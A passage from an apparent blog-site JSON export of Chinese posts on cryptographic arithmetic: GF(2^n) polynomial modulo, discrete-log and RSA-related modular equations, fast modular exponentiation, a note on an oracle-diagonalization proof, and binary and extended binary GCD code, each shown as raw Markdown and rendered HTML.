y&lt;&lt;(xl-yl))，保证y&lt;&lt;(xl-yl)的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为x^y^y=x，也就是减去两次y等于没有减，从而死循环 计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元","raw":"---\ntitle: $GF(2^n)$上算术运算的实现\ndate: 2018-10-18 20:06:10\ndescription: 在$GF(2^n)$域上的算术运算的python代码实现\ntags:\n- GF2n\ncategories:\n- 数学\n- 密码学\n---\n\n- [代码](https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py)\n\n- 几个关键点\n\n  - 求模时，算法如下\n\n    ```python\n    def __modAndDiv__(x, y):\n        \"\"\"\n        return the (x%y, x/y)\n        \"\"\"\n        if y == 0:\n            raise ZeroDivisionError\n        xl = util.bitLen(x)\n        yl = util.bitLen(y)\n        if xl < yl:\n            return x, 0\n        d = 0\n        while xl >= yl:\n            x, d = Polynomial.__sub__(x, y << (xl - yl)), Polynomial.__add__(d, (1 << (xl - yl)))\n            xl = util.bitLen(x)\n        return x, d\n    ```\n\n    要注意，不可以直接`__sub__(x, y)`，要`__sub__(x, y<<(xl-yl))`，保证`y<<(xl-yl)`的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为`x^y^y=x`，也就是减去两次`y`等于没有减，从而死循环\n\n  - 计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元\n","content":"<ul>\n<li><p><a href=\"https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py\" target=\"_blank\" rel=\"noopener\">代码</a></p>\n</li>\n<li><p>几个关键点</p>\n<ul>\n<li><p>求模时，算法如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__modAndDiv__</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    return the (x%y, x/y)</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ZeroDivisionError</span><br><span class=\"line\">    xl = util.bitLen(x)</span><br><span class=\"line\">    yl = util.bitLen(y)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> xl &lt; yl:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x, <span class=\"number\">0</span></span><br><span class=\"line\">    d = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> xl &gt;= yl:</span><br><span class=\"line\">        x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (<span class=\"number\">1</span> &lt;&lt; (xl - yl)))</span><br><span class=\"line\">        xl = util.bitLen(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x, d</span><br></pre></td></tr></table></figure>\n<p>要注意，不可以直接<code>__sub__(x, y)</code>，要<code>__sub__(x, y&lt;&lt;(xl-yl))</code>，保证<code>y&lt;&lt;(xl-yl)</code>的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为<code>x^y^y=x</code>，也就是减去两次<code>y</code>等于没有减，从而死循环</p>\n</li>\n<li><p>计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元</p>\n</li>\n</ul>\n</li>\n</ul>\n","slug":"GF-2-n上算术运算的实现","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"GF2n","slug":"GF2n","permalink":"https://h-zex.github.io/tags/GF2n/"}]},{"title":"$x^y=z(mod\\ n) 的所有相关问题的解法$","date":"2018-10-18T10:45:58.000Z","path":"2018/10/18/y-z-mod-n-的所有相关问题的解法/","text":"以下$x$为未知数。所有数都是整数 $a^x=b(mod\\ n)$ 这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。 当$gcd(a, n)=n$时 如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数 当$gcd(a,n)=1$时 使用baby-step giant-step算法，具体可以参考求解a^x=b(mod m) $x^a=b(mod\\ n)$ 这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性 $n$为质数时 根据费尔马小定理有$x^{n-1}=1(mod\\ n)$ 求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$ $n$为合数时 目前是没有通用的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有 可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$ $a^b=x(mod\\ n)$ 快速模幂，算法如下 123456789101112def fastModulePow(x, y, n): \"\"\" :return: x**y mod n \"\"\" if y == 0: return 1 % n ans, x = 1 % n, x % n while y != 0: if (y &amp; 1) == 1: ans = x * ans % n x, y = x * x % n, y // 2 return ans","raw":"---\ntitle: $x^y=z(mod\\ n) 的所有相关问题的解法$\ndate: 2018-10-18 18:45:58\ntags:\n- 离散对数\n- 快速幂\n- RSA\ncategories:\n- 数学\n- 密码学\n---\n\n> 以下$x$为未知数。所有数都是整数\n\n## $a^x=b(mod\\ n)$\n\n- 这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。\n\n#### 当$gcd(a, n)=n$时\n\n- 如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数\n\n#### 当$gcd(a,n)=1$时\n\n- 使用baby-step giant-step算法，具体可以参考[求解a^x=b(mod m)](http://www.narutoacm.com/archives/solve-discrete-log/)\n\n## $x^a=b(mod\\ n)$\n\n- 这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性\n\n#### $n$为质数时\n\n- 根据费尔马小定理有$x^{n-1}=1(mod\\ n)$\n- 求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$\n\n#### $n$为合数时\n\n- 目前是没有**通用**的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有\n- 可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$\n\n## $a^b=x(mod\\ n)$\n\n- 快速模幂，算法如下\n\n  ```python\n  def fastModulePow(x, y, n):\n      \"\"\"\n      :return: x**y mod n\n      \"\"\"\n      if y == 0:\n          return 1 % n\n      ans, x = 1 % n, x % n\n      while y != 0:\n          if (y & 1) == 1:\n              ans = x * ans % n\n          x, y = x * x % n, y // 2\n      return ans\n  ```\n\n","content":"<blockquote>\n<p>以下$x$为未知数。所有数都是整数</p>\n</blockquote>\n<h2 id=\"a-x-b-mod-n\"><a href=\"#a-x-b-mod-n\" class=\"headerlink\" title=\"$a^x=b(mod\\ n)$\"></a>$a^x=b(mod\\ n)$</h2><ul>\n<li>这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。</li>\n</ul>\n<h4 id=\"当-gcd-a-n-n-时\"><a href=\"#当-gcd-a-n-n-时\" class=\"headerlink\" title=\"当$gcd(a, n)=n$时\"></a>当$gcd(a, n)=n$时</h4><ul>\n<li>如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数</li>\n</ul>\n<h4 id=\"当-gcd-a-n-1-时\"><a href=\"#当-gcd-a-n-1-时\" class=\"headerlink\" title=\"当$gcd(a,n)=1$时\"></a>当$gcd(a,n)=1$时</h4><ul>\n<li>使用baby-step giant-step算法，具体可以参考<a href=\"http://www.narutoacm.com/archives/solve-discrete-log/\" target=\"_blank\" rel=\"noopener\">求解a^x=b(mod m)</a></li>\n</ul>\n<h2 id=\"x-a-b-mod-n\"><a href=\"#x-a-b-mod-n\" class=\"headerlink\" title=\"$x^a=b(mod\\ n)$\"></a>$x^a=b(mod\\ n)$</h2><ul>\n<li>这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性</li>\n</ul>\n<h4 id=\"n-为质数时\"><a href=\"#n-为质数时\" class=\"headerlink\" title=\"$n$为质数时\"></a>$n$为质数时</h4><ul>\n<li>根据费尔马小定理有$x^{n-1}=1(mod\\ n)$</li>\n<li>求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$</li>\n</ul>\n<h4 id=\"n-为合数时\"><a href=\"#n-为合数时\" class=\"headerlink\" title=\"$n$为合数时\"></a>$n$为合数时</h4><ul>\n<li>目前是没有<strong>通用</strong>的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有</li>\n<li>可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$</li>\n</ul>\n<h2 id=\"a-b-x-mod-n\"><a href=\"#a-b-x-mod-n\" class=\"headerlink\" title=\"$a^b=x(mod\\ n)$\"></a>$a^b=x(mod\\ n)$</h2><ul>\n<li><p>快速模幂，算法如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fastModulePow</span><span class=\"params\">(x, y, n)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    :return: x**y mod n</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span> % n</span><br><span class=\"line\">    ans, x = <span class=\"number\">1</span> % n, x % n</span><br><span class=\"line\">    <span class=\"keyword\">while</span> y != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (y &amp; <span class=\"number\">1</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            ans = x * ans % n</span><br><span class=\"line\">        x, y = x * x % n, y // <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n","slug":"y-z-mod-n-的所有相关问题的解法","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"离散对数","slug":"离散对数","permalink":"https://h-zex.github.io/tags/离散对数/"},{"name":"快速幂","slug":"快速幂","permalink":"https://h-zex.github.io/tags/快速幂/"},{"name":"RSA","slug":"RSA","permalink":"https://h-zex.github.io/tags/RSA/"}]},{"title":"对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解","date":"2018-09-29T06:45:15.000Z","path":"2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/","text":"证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——无论集合$A$是否构造好，我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以： 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。","raw":"---\ntitle: 对Introduction to the Theory of Computation 3rd Theorem 9.20 的一些理解\ndate: 2018-09-29 14:45:15\ntags:\n- 图灵机\n- P与NP\n- 对角化\ncategories:\n- 计算理论\n---\n\n- {% asset_img 1.png %}\n- 证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长\n- 按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——**无论集合$A$是否构造好，**我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致\n- 在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反\n- 可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致\n- 一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：\n  - 如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的\n  - 如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO\n- 这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。\n","content":"<ul>\n<li><img src=\"/2018/09/29/对ITOC-3rd-Theorem-9-20-的一些理解/1.png\"></li>\n<li>证明中，通过枚举所有的P时间内运行的图灵机，然后利用对角化方法，来构造集合$A$，使得对于某一个$M_i$和某一个选定的$n$，要么$M_i$识别$1^n$，但是$A$不包含长度为n的字符串，要么$M_i$不识别$1^n$，但是$A$包含某一个长度为n的字符串。并且，为了使得$M_i$与$n$可以一一对应，要求所选取的$n$单调增长</li>\n<li>按照文中描述的方法，构造似乎可以成立。但是，有一个重要的地方作者没有提及——<strong>无论集合$A$是否构造好，</strong>我们都应该可以运行任意一台$M_i$，$M_i$行为要保持一致</li>\n<li>在我们运行$M_i$来构造集合$A$ 的过程中，每次$M_i$查询orcale，orcale都会因为长度为$n$ 的字符串尚未被决定是否加进去集合$A$而回答NO，不过，如果我们决定长度为$n$的字符串是否加进去集合$A$中后，orcale会如实回答。那么，在长度为n的字符串被决定是否加进去集合$A$之前和之后，orcale对某些字符串的回答不一致是否会导致$M_i$ 的行为改变，从而本来$M_i$不识别$1^n$，现在却识别了$1^n$，或者相反</li>\n<li>可以证明，无论$A$是否构造好，$M_i$的行为还是会保持一致</li>\n<li>一开始，长度为$n$的字符串还没有加进去时，orcale都是回答NO，所以：<ul>\n<li>如果$M_i$不识别$1^n$，我们就给$A$加进去一个$M_i$没有询问到长度为n的字符串，从而，虽然集合$A$现在有了长度为$n$的字符串，但是，对于输入$1^n$，$M_i$对orcale的询问的答案依然全部是NO——因为输入确定，$M_i$确定，所以$M_i$究竟会询问orcale哪些字符串也是确定的——只要我们保证对询问的回答是一致的</li>\n<li>如果$M_i$识别$1^n$，那么我们根本就不会给集合$A$加进去长度为$n$的字符串，那么，对于输入$1^n$，orcale对$M_i$的询问的结果依然全部是NO</li>\n</ul>\n</li>\n<li>这个证明要成立还有一个很重要的地方，图灵机是可数个的，因为对于每一台$M_i$，我们都使用独特的$n$，那么，如果图灵机有不可数个，这个一一对应关系就无法建立。</li>\n</ul>\n","slug":"对ITOC-3rd-Theorem-9-20-的一些理解","categories":[{"name":"计算理论","slug":"计算理论","permalink":"https://h-zex.github.io/categories/计算理论/"}],"tags":[{"name":"图灵机","slug":"图灵机","permalink":"https://h-zex.github.io/tags/图灵机/"},{"name":"P与NP","slug":"P与NP","permalink":"https://h-zex.github.io/tags/P与NP/"},{"name":"对角化","slug":"对角化","permalink":"https://h-zex.github.io/tags/对角化/"}]},{"title":"Binary GCD And Extend Binary GCD","date":"2018-09-17T13:58:41.000Z","path":"2018/09/17/Binary-GCD-And-Extend-Binary-GCD/","text":"Binary GCD 代码 1234567891011121314151617181920212223def binaryGCD(x, y): x, y = abs(x), abs(y) if x == 0 or y == 0: return x + y if x == y: return x cnt = 0 # this cycle is O(N^2)(assume that N = max(lgx, lgy)) while ((x &amp; 1) | (y &amp; 1)) == 0: cnt += 1 x = x &gt;&gt; 1 y = y &gt;&gt; 1 # the y below is surely odd # when x-y, x and y are odd, so x will become even # so the x&gt;&gt;1 will be run every cycles # so this cycle is O(N^2) while x != 0: while (x &amp; 1) == 0: x = x &gt;&gt; 1 if y &gt; x: x, y = y, x x, y = x - y, y return y * (1 &lt;&lt; cnt) 复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为y必然为奇数，所以x-y为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$ trivial 版本的GCD如下 1234def GCD(x, y): while y != 0: x, y = y, x % y return x 需要$O(n^3)$的复杂度 Extend Binary GCD 代码，引用自 1234567891011121314151617181920212223242526272829303132333435363738394041424344def extendBinaryGCD(a, b): \"\"\"Extended binary GCD. Given input a, b the function returns s, t, d such that gcd(a,b) = d = as + bt.\"\"\" if a == 0: return 0, 1, b if b == 0: return 1, 0, a if a == b: return 1, 0, a u, v, s, t, r = 1, 0, 0, 1, 0 while (a % 2 == 0) and (b % 2 == 0): a, b, r = a // 2, b // 2, r + 1 alpha, beta = a, b # # from here on we maintain a = u * alpha + v * beta # and b = s * alpha + t * beta # while a % 2 == 0: # v is always even a = a // 2 if (u % 2 == 0) and (v % 2 == 0): u, v = u // 2, v // 2 else: u, v = (u + beta) // 2, (v - alpha) // 2 while a != b: if b % 2 == 0: b = b // 2 # # Commentary: note that here, since b is even, # (i) if s, t are both odd then so are alpha, beta # (ii) if s is odd and t even then alpha must be even, so beta is odd # (iii) if t is odd and s even then beta must be even, so alpha is odd # so for each of (i), (ii) and (iii) s + beta and t - alpha are even # if (s % 2 == 0) and (t % 2 == 0): s, t = s // 2, t // 2 else: s, t = (s + beta) // 2, (t - alpha) // 2 elif b &lt; a: a, b, u, v, s, t = b, a, s, t, u, v else: b, s, t = b - a, s - u, t - v return s, t, (2 ** r) * a 思路：从19行开始，维护式子b=s*alpha+t*beta 的成立——可以验证，每次s、t更改后，式子还是成立","raw":"---\ntitle: Binary GCD And Extend Binary GCD\ndate: 2018-09-17 21:58:41\ntags:\n- 欧几里得算法\n- 扩展欧几里得\n- 二进制欧几里得算法\ncategories:\n- 数学\n- 密码学\n---\n\n## Binary GCD\n\n- 代码\n\n  ```python\n  def binaryGCD(x, y):\n      x, y = abs(x), abs(y)\n      if x == 0 or y == 0:\n          return x + y\n      if x == y:\n          return x\n      cnt = 0\n      # this cycle is O(N^2)(assume that N = max(lgx, lgy))\n      while ((x & 1) | (y & 1)) == 0:\n          cnt += 1\n          x = x >> 1\n          y = y >> 1\n      # the y below is surely odd\n      # when x-y, x and y are odd, so x will become even\n      # so the x>>1 will be run every cycles\n      # so this cycle is O(N^2)\n      while x != 0:\n          while (x & 1) == 0:\n              x = x >> 1\n          if y > x:\n              x, y = y, x\n          x, y = x - y, y\n      return y * (1 << cnt)\n  ```\n\n- 复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为`y`必然为奇数，所以`x-y`为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$\n\n- trivial 版本的GCD如下\n\n  ```python\n  def GCD(x, y):\n      while y != 0:\n          x, y = y, x % y\n      return x\n  ```\n\n  需要$O(n^3)$的复杂度\n\n## Extend Binary GCD\n\n- 代码，[引用自](http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf)\n\n  ```python\n  def extendBinaryGCD(a, b):\n      \"\"\"Extended binary GCD.\n      Given input a, b the function returns s, t, d\n      such that gcd(a,b) = d = as + bt.\"\"\"\n      if a == 0:\n          return 0, 1, b\n      if b == 0:\n          return 1, 0, a\n      if a == b:\n          return 1, 0, a\n      u, v, s, t, r = 1, 0, 0, 1, 0\n      while (a % 2 == 0) and (b % 2 == 0):\n          a, b, r = a // 2, b // 2, r + 1\n      alpha, beta = a, b\n      #\n      # from here on we maintain a = u * alpha + v * beta\n      # and b = s * alpha + t * beta\n      #\n      while a % 2 == 0:\n          # v is always even\n          a = a // 2\n          if (u % 2 == 0) and (v % 2 == 0):\n              u, v = u // 2, v // 2\n          else:\n              u, v = (u + beta) // 2, (v - alpha) // 2\n      while a != b:\n          if b % 2 == 0:\n              b = b // 2\n              #\n              # Commentary: note that here, since b is even,\n              # (i) if s, t are both odd then so are alpha, beta\n              # (ii) if s is odd and t even then alpha must be even, so beta is odd\n              # (iii) if t is odd and s even then beta must be even, so alpha is odd\n              # so for each of (i), (ii) and (iii) s + beta and t - alpha are even\n              #\n              if (s % 2 == 0) and (t % 2 == 0):\n                  s, t = s // 2, t // 2\n              else:\n                  s, t = (s + beta) // 2, (t - alpha) // 2\n          elif b < a:\n              a, b, u, v, s, t = b, a, s, t, u, v\n          else:\n              b, s, t = b - a, s - u, t - v\n      return s, t, (2 ** r) * a\n  ```\n\n- 思路：从19行开始，维护式子b=s\\*alpha+t\\*beta 的成立——可以验证，每次s、t更改后，式子还是成立\n\n","content":"<h2 id=\"Binary-GCD\"><a href=\"#Binary-GCD\" class=\"headerlink\" title=\"Binary GCD\"></a>Binary GCD</h2><ul>\n<li><p>代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binaryGCD</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    x, y = abs(x), abs(y)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == <span class=\"number\">0</span> <span class=\"keyword\">or</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x + y</span><br><span class=\"line\">    <span class=\"keyword\">if</span> x == y:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"comment\"># this cycle is O(N^2)(assume that N = max(lgx, lgy))</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((x &amp; <span class=\"number\">1</span>) | (y &amp; <span class=\"number\">1</span>)) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        cnt += <span class=\"number\">1</span></span><br><span class=\"line\">        x = x &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        y = y &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># the y below is surely odd</span></span><br><span class=\"line\">    <span class=\"comment\"># when x-y, x and y are odd, so x will become even</span></span><br><span class=\"line\">    <span class=\"comment\"># so the x&gt;&gt;1 will be run every cycles</span></span><br><span class=\"line\">    <span class=\"comment\"># so this cycle is O(N^2)</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (x &amp; <span class=\"number\">1</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">            x = x &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> y &gt; x:</span><br><span class=\"line\">            x, y = y, x</span><br><span class=\"line\">        x, y = x - y, y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y * (<span class=\"number\">1</span> &lt;&lt; cnt)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>复杂度分析：设$n=max(bitlen(x), bitlen(y))$。17行开始的循环中，因为<code>y</code>必然为奇数，所以<code>x-y</code>为偶数，所以第18行的循环在每次外层循环运行一次时都至少运行一次，所以有$O(n)$次循环，每次循环需要$O(n)$的均摊复杂度——因为第18行的每次都是$O(n)$的复杂度，然后整个算法中这种移位最多有$O(n)$次，所以，整个算法复杂度为$O(n^2)$</p>\n</li>\n<li><p>trivial 版本的GCD如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GCD</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> y != <span class=\"number\">0</span>:</span><br><span class=\"line\">        x, y = y, x % y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x</span><br></pre></td></tr></table></figure>\n<p>需要$O(n^3)$的复杂度</p>\n</li>\n</ul>\n<h2 id=\"Extend-Binary-GCD\"><a href=\"#Extend-Binary-GCD\" class=\"headerlink\" title=\"Extend Binary GCD\"></a>Extend Binary GCD</h2><ul>\n<li><p>代码，<a href=\"http://www.ucl.ac.uk/~ucahcjm/combopt/ext_gcd_python_programs.pdf\" target=\"_blank\" rel=\"noopener\">引用自</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 